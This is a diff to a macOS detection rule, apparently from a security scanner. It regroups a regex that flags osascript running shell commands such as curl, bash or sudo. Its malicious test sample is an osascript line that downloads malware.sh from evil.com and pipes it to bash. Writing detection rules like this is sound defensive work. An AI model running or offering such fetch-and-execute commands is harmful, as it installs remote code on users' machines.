@@ -4,7 +4,7 @@ description: >
   Detects osascript executing remote scripts or inline AppleScript. macOS-specific attack vector.
 
 pattern: |
-  (?i)osascript.*do\s+shell\s+script.*(curl|wget|bash|sh|python|ruby|perl|rm|chmod|sudo|launchctl)
+  (?i)(osascript.*do\s+shell\s+script.*(curl|wget|bash|sh|python|ruby|perl|rm|chmod|sudo|launchctl))
 
 malicious:
   - 'osascript -e ''do shell script "curl http://evil.com/malware.sh | bash"'''
